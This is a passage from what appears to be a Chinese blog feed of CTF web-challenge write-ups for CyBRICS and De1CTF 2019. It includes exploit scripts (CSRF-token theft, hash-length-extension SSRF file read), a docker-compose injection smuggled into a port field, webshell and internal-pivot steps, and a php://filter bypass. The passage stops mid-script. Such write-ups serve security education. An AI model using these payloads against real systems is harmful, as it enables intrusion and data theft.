class="keyword">if</span>(tmp):</span><br><span class="line">print(tmp.group(<span class="number">1</span>))</span><br><span class="line"><span class="keyword">return</span> tmp.group(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">"[x] getToken() error!"</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ask</span><span class="params">(askData)</span>:</span></span><br><span class="line">tokenRaw = requests.get(url,headers=header).text</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">"csrf-token"</span>:getToken(tokenRaw),</span><br><span class="line"><span class="string">"question"</span>:askData,</span><br><span class="line"><span class="string">"submit"</span>:<span class="string">"Ask"</span></span><br><span class="line">&#125;</span><br><span class="line">askRespose = requests.post(url,data=data,headers=header)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> askRespose.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFlag</span><span class="params">(token)</span>:</span></span><br><span class="line"><span class="comment"># return "http://95.179.190.31/index.php/5am3_flag520.css?csrf-token="+token+"%26flag=1%26a.css"</span></span><br><span class="line"><span class="keyword">return</span> url+<span class="string">"/index.php/&#123;:d&#125;.css?csrf-token=&#123;:s&#125;%26flag=1%26a.css/abc.css"</span>.format(random.randint(<span class="number">1</span>,<span class="number">23333333333</span>),token)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url1 = url+<span class="string">"index.php/&#123;:d&#125;.css"</span>.format(random.randint(<span class="number">1</span>,<span class="number">23333333333</span>))</span><br><span class="line">ask(url1)</span><br><span class="line">print(<span class="string">"loading..."</span>)</span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">tokenRaw = requests.get(url1,headers=header).text</span><br><span class="line"><span class="keyword">if</span> (<span class="string">"Show flag"</span> <span class="keyword">in</span> tokenRaw):</span><br><span class="line">tokenAdmin =getToken(tokenRaw)</span><br><span class="line">print(<span class="string">"loading..."</span>)</span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">url2 = getFlag(tokenAdmin)</span><br><span class="line">print(url2)</span><br><span class="line">ask(url2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> requests.get(url2.replace(<span class="string">"%26"</span>,<span class="string">"&amp;"</span>)).text</span><br></pre></td></tr></table></figure><p>得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cybrics&#123;Bu9s_C4N_83_uN1N73Nd3D!&#125;</span><br></pre></td></tr></table></figure></p><h2 id="0x05-Dock-Escape-CTB-Easy-151-pts"><a href="#0x05-Dock-Escape-CTB-Easy-151-pts" class="headerlink" title="0x05 Dock Escape (CTB, Easy, 151 pts)"></a>0x05 Dock Escape (CTB, Easy, 151 pts)</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p>Author: George Zaytsev (groke)</p><p>We want you to get a flag from hosting server. Flag path is /home/flag<br><a href="http://95.179.188.234:8080/" target="_blank" rel="noopener">http://95.179.188.234:8080/</a></p><h3 id="题目解答-4"><a href="#题目解答-4" class="headerlink" title="题目解答"></a>题目解答</h3><p>当时一直想是启动之后去利用某个trick去逃逸，所以一直卡在这儿，比完之后才发现其实是在启动的时候的问题。</p><p>一般来说docker是无法读取母机的文件的，但是如果在启动的时候加入一些参数就有可能呢个触发逃逸，但是最简单的方法就是将对应的目录挂载到docker上。</p><p>在端口号处随便输入发现会触发报错<br><img src="https://i.loli.net/2019/08/11/jPhFiBnEDHKIw9o.png" alt="C3202CF6-8086-4524-812C-42F55D50F1B4.png"></p><p>根据报错信息发现是使用了<code>docker-compose.yml</code>，所以根据对应的语法构造payload就行了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2233:12345\n    volumes:\n      - /home:/ctf #</span><br></pre></td></tr></table></figure><p>这里最好使用burp来修包打</p><p><img src="https://i.loli.net/2019/08/11/it6X3gW4fhmoBxZ.png" alt="50DB0AB9-8D89-49BF-8205-E378CF61AE70.png"></p><p>之后直接使用client.py来读flag</p><p><img src="https://i.loli.net/2019/08/11/PJvtoNqpsechr91.png" alt="05E9C920-482C-4F0B-9A7C-69A51DA31398.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;又是摸鱼的一天&lt;/p&gt;
&lt;h2 id=&quot;0x01-Bitkoff-Bank-Web-Easy-50-
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>De1CTF 2019 WEB WP</title>
    <link href="http://zer0yu.github.io/2019/08/11/De1CTF-2019-wp/"/>
    <id>http://zer0yu.github.io/2019/08/11/De1CTF-2019-wp/</id>
    <published>2019-08-11T00:34:05.000Z</published>
    <updated>2019-08-11T01:00:06.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在家宅着不想写wp，来学第一天补上</p><h2 id="0x01-SSRF-Me"><a href="#0x01-SSRF-Me" class="headerlink" title="0x01 SSRF Me"></a>0x01 SSRF Me</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>SSRF ME TO GET FLAG.</p><p><a href="http://139.180.128.86/" target="_blank" rel="noopener">http://139.180.128.86/</a></p><h3 id="题目解答"><a href="#题目解答" class="headerlink" title="题目解答"></a>题目解答</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><ol><li>默认sign的时候试讲action设置为scan来讲文件读进result.txt文件</li><li>需要设置sign中的action为read（hash扩展攻击）</li><li>利用<a href="https://bugs.python.org/issue35907来进行ssrf读文件" target="_blank" rel="noopener">https://bugs.python.org/issue35907来进行ssrf读文件</a></li></ol><p>EXP:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> urllib.parse <span class="keyword">as</span> up</span><br><span class="line"></span><br><span class="line">readfile = <span class="string">'local_file:///proc/self/cwd/flag.txt'</span></span><br><span class="line">url1 =  <span class="string">'http://139.180.128.86/geneSign?param='</span> + readfile</span><br><span class="line">req = requests.get(url = url1)</span><br><span class="line">sign = req.content</span><br><span class="line">hash_sign = hashpumpy.hashpump(sign, readfile + <span class="string">'scan'</span>, <span class="string">'read'</span>, <span class="number">16</span>)</span><br><span class="line">sign_next = hash_sign[<span class="number">0</span>]</span><br><span class="line">action_next = up.quote(hash_sign[<span class="number">1</span>][len(readfile):])</span><br><span class="line">url2 = <span class="string">'http://139.180.128.86/De1ta?param='</span>+readfile</span><br><span class="line">result = requests.get(url = url2, cookies=&#123;<span class="string">'sign'</span>: sign_next, <span class="string">'action'</span>: action_next&#125;)</span><br><span class="line">print(result.content)</span><br></pre></td></tr></table></figure></p><p>官方解法：<br><a href="https://github.com/De1ta-team/De1CTF2019/blob/8f981109d95af76456d1e59deab058f8a7bba3b0/writeup/web/SSRF%20Me/README_zh.md" target="_blank" rel="noopener">https://github.com/De1ta-team/De1CTF2019/blob/8f981109d95af76456d1e59deab058f8a7bba3b0/writeup/web/SSRF%20Me/README_zh.md</a></p><h2 id="0x02-ShellShellShell"><a href="#0x02-ShellShellShell" class="headerlink" title="0x02 ShellShellShell"></a>0x02 ShellShellShell</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>hint : The flag file ,with “flag” keyword ,is in the inside computer.(flag文件在内网的机子上，并且flag文件的文件名带有flag关键字)</p><p>shell me plz</p><h3 id="题目解答-1"><a href="#题目解答-1" class="headerlink" title="题目解答"></a>题目解答</h3><p>因为对easy-php这题印象深刻，所以看到题目之后立马就联想到了，所以老套路走一波。参考下面这个wp很容易就能getshell</p><p><a href="https://github.com/rkmylo/ctf-write-ups/tree/master/2018-n1ctf/web/easy-php-540" target="_blank" rel="noopener">https://github.com/rkmylo/ctf-write-ups/tree/master/2018-n1ctf/web/easy-php-540</a></p><p>进到内网之后先查看<code>/etc/hosts</code>文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1localhost</span><br><span class="line">::1localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0ip6-localnet</span><br><span class="line">ff00::0ip6-mcastprefix</span><br><span class="line">ff02::1ip6-allnodes</span><br><span class="line">ff02::2ip6-allrouters</span><br><span class="line">172.18.0.3df459fa2cbad</span><br></pre></td></tr></table></figure></p><p>发现对应的内网地址，之后使用<strong>fcn</strong>代理出来，在172.18.0.2上的80端口发现一个代码审计题，题目出自pwnhub，所以参考wp直接传webshell之后包含getshell</p><p><a href="https://cloud.tencent.com/developer/article/1360551" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1360551</a></p><p>之后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;*flag*&quot;</span><br></pre></td></tr></table></figure></p><p>即可得到flag</p><p>PS: 我觉得这题的dockerfile值得一看</p><h2 id="0x03-cloudmusic-rev"><a href="#0x03-cloudmusic-rev" class="headerlink" title="0x03 cloudmusic_rev"></a>0x03 cloudmusic_rev</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>滑稽云音乐平台 2.0 上线了。</p><p>Comical CloudMusis 2.0 is online.</p><h3 id="题目解答-2"><a href="#题目解答-2" class="headerlink" title="题目解答"></a>题目解答</h3><p>首先想到国赛决赛中出现的1.0版本<br><a href="https://github.com/impakho/ciscn2019_final_web1" target="_blank" rel="noopener">https://github.com/impakho/ciscn2019_final_web1</a></p><p>然后按照这个套路做题：</p><ol><li><p>首先是注册账号处理验证码，这里要求验证码是6位，所以成功注册一个账号<code>adfasd1/123456aaaa</code></p></li><li><p>右键查看源代码发现任意文件下载</p><p><img src="https://i.loli.net/2019/08/11/RaYUscFLO6HJliW.png" alt="EE10D927-059B-4F33-AE11-6E1DB62D9524.png"></p></li></ol><ol start="3"><li>但是不能直接下载php后缀的文件需要bypass</li></ol><p>bypass:<br>(1) 将<code>php://filter/read=convert.base64-encode/resource=../include/firmware.php</code> urlencode最好用bp来完全编码<br>(2) base64下载源码</p><ol start="4"><li><p>因为代码里面此处的不同<br><code>$firmware_filename=md5(mt_rand().$_SERVER[&#39;REMOTE_ADDR&#39;]);</code><br>所以exp里面要改成IP</p></li><li><p>上传溢出admin密码的长度变了，之前是0x300，现在是0x70</p></li></ol><p><img src="https://i.loli.net/2019/08/11/3a7tZyfeSjDhTqX.png" alt="屏幕快照 2019-08-04 下午11.22.38.png"></p><p><img src="https://i.loli.net/2019/08/11/XH2ULuawiWTcktf.png" alt="屏幕快照 2019-08-04 下午11.13.03.png"></p><ol start="6"><li>修改之前的exp后盲打得到flag</li></ol><p>{‘username’: ‘admin’, ‘password’: ‘Mike84eiNxHcMVCz’}</p><p><img src="https://i.loli.net/2019/08/11/kPiTbAh24oDrsRO.png" alt="屏幕快照 2019-08-04 下午10.29.24.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span 